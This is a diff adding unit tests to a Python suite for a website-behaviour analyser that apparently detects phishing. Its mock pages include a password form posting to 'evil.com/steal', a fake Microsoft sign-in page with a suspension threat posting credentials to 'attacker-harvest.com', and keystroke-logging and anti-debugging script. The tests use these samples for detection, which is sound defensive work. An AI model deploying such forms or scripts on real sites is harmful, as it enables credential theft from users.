@@ -386,6 +386,164 @@ class TestAgent8Behavior(unittest.TestCase):
         for key in forbidden_keys:
             self.assertNotIn(key, result, f"Agent 8 response MUST NOT contain forbidden score/verdict key '{key}'")
 
+    # 25. Evidence item schema validation & Evidence Ledger / Normalizer integration
+    @patch("agents.agent8_behavior.fetch_webpage")
+    def test_25_evidence_schema_and_ledger(self, mock_fetch):
+        from services.evidence_schema import validate_evidence_item
+        from services.evidence_normalizer import normalize_evidence_item
+        from services.evidence_ledger import EvidenceLedger
+
+        mock_fetch.return_value = {
+            "status": "success",
+            "status_code": 200,
+            "final_url": "https://example.com",
+            "headers": {},
+            "html": """
+            <html>
+            <head><meta http-equiv="refresh" content="5;url=https://other.com"></head>
+            <body>
+                <form action="https://evil.com/steal" method="POST">
+                    <input type="password" name="pwd" />
+                    <input type="hidden" name="tok" value="123" />
+                </form>
+            </body>
+            </html>
+            """,
+            "redirect_count": 0,
+            "redirect_chain": ["https://example.com"]
+        }
+
+        result = analyze_behavior("https://example.com")
+        evidence = result.get("evidence", [])
+        self.assertEqual(len(evidence), 8)
+
+        expected_ids = [f"E8-{i:02d}" for i in range(1, 9)]
+        actual_ids = [e["evidence_id"] for e in evidence]
+        self.assertEqual(actual_ids, expected_ids)
+
+        for item in evidence:
+            is_valid, errors = validate_evidence_item(item)
+            self.assertTrue(is_valid, f"Item {item.get('evidence_id')} failed validation: {errors}")
+            # Normalizer check
+            norm_ev = normalize_evidence_item(item, agent_identifier="A8", agent_result=result)
+            self.assertIsNotNone(norm_ev)
+            self.assertEqual(norm_ev["evidence_id"], item["evidence_id"])
+
+        # Ledger check
+        ledger = EvidenceLedger(target="https://example.com")
+        ledger.add_entries_from_agent(result)
+        self.assertEqual(len(ledger.entries), 8)
+        self.assertEqual(len(ledger.get_entries(agent_id=8)), 8)
+
+    # 26. TCE Integration & Polarity Verification
+    @patch("agents.agent8_behavior.fetch_webpage")
+    def test_26_tce_integration_and_polarity(self, mock_fetch):
+        from services.trust_calculation_engine import TrustCalculationEngine
+        from services.evidence_ledger import EvidenceLedger
+
+        mock_fetch.return_value = {
+            "status": "success",
+            "status_code": 200,
+            "final_url": "https://suspicious-login.com",
+            "headers": {},
+            "html": """
+            <html>
+            <head><title>Microsoft Login</title></head>
+            <body>
+                <h2>Sign in to your Microsoft account</h2>
+                <p>Your account will be suspended immediately unless confirmed.</p>
+                <form action="https://attacker-harvest.com/login" method="POST">
+                    <input type="text" name="email" />
+                    <input type="password" name="password" />
+                </form>
+            </body>
+            </html>
+            """,
+            "redirect_count": 0,
+            "redirect_chain": ["https://suspicious-login.com"]
+        }
+
+        result = analyze_behavior("https://suspicious-login.com")
+        ledger = EvidenceLedger(target="https://suspicious-login.com")
+        ledger.add_entries_from_agent(result)
+
+        tce = TrustCalculationEngine()
+        tce_output = tce.calculate_trust(ledger)
+        self.assertIn("trust_score", tce_output)
+        self.assertIn("risk_score", tce_output)
+        self.assertIn("verdict", tce_output)
+        # TCE should calculate risk from the detected fake login and harvesting indicators
+        self.assertGreater(tce_output["risk_score"], 0.0)
+
+    # 27. Benign script / WebSockets / Clipboard handling
+    def test_27_benign_scripts_and_websockets(self):
+        html = """
+        <script>
+            // Normal WebSocket telemetry and clipboard helper
+            const socket = new WebSocket("wss://api.example.com/stream");
+            function copyCode() {
+                navigator.clipboard.writeText("code123");
+            }
+        </script>
+        """
+        soup = BeautifulSoup(html, "html.parser")
+        js_ind = analyze_javascript_indicators(soup, html)
+        # Standard WebSocket & clipboard should not trigger malicious JS indicator
+        self.assertFalse(js_ind["detected"])
+
+    # 28. Anti-debugging and JS trap indicators
+    def test_28_anti_debugging_detection(self):
+        html = """
+        <script>
+            document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+            window.addEventListener('keydown', function(e) { console.log(e.key); });
+        </script>
+        """
+        soup = BeautifulSoup(html, "html.parser")
+        js_ind = analyze_javascript_indicators(soup, html)
+        self.assertTrue(js_ind["detected"])
+        types = [i["type"] for i in js_ind["indicators"]]
+        self.assertIn("anti_analysis", types)
+        self.assertIn("keystroke_monitoring", types)
+
+    # 29. Adversarial payload / large response handling
+    @patch("agents.agent8_behavior.fetch_webpage")
+    def test_29_adversarial_large_response(self, mock_fetch):
+        # Generate 3MB HTML string
+        huge_html = "<html><body>" + ("<p>Text</p>" * 100000) + "</body></html>"
+        mock_fetch.return_value = {
+            "status": "success",
+            "status_code": 200,
+            "final_url": "https://example.com/huge",
+            "headers": {},
+            "html": huge_html,
+            "redirect_count": 0,
+            "redirect_chain": ["https://example.com/huge"]
+        }
+        result = analyze_behavior("https://example.com/huge")
+        self.assertEqual(result["status"], "success")
+        self.assertEqual(len(result["evidence"]), 8)
+
+    # 30. Network error and connection failure robustness
+    @patch("agents.agent8_behavior.fetch_webpage")
+    def test_30_network_error_robustness(self, mock_fetch):
+        mock_fetch.return_value = {
+            "status": "error",
+            "message": "Connection refused by remote host",
+            "final_url": "https://unreachable-host.example",
+            "headers": {},
+            "html": "",
+            "redirect_count": 0,
+            "redirect_chain": ["https://unreachable-host.example"]
+        }
+        result = analyze_behavior("https://unreachable-host.example")
+        self.assertEqual(result["status"], "success")
+        self.assertTrue(len(result["errors"]) > 0)
+        self.assertEqual(len(result["evidence"]), 8)
+        # All evidence should safely be info / non-detected
+        for ev in result["evidence"]:
+            self.assertEqual(ev["severity"], "info")
+
 
 def run_all_tests():
     suite = unittest.TestLoader().loadTestsFromTestCase(TestAgent8Behavior)
@@ -404,3 +562,4 @@ def run_all_tests():
 if __name__ == "__main__":
     success = run_all_tests()
     sys.exit(0 if success else 1)
+
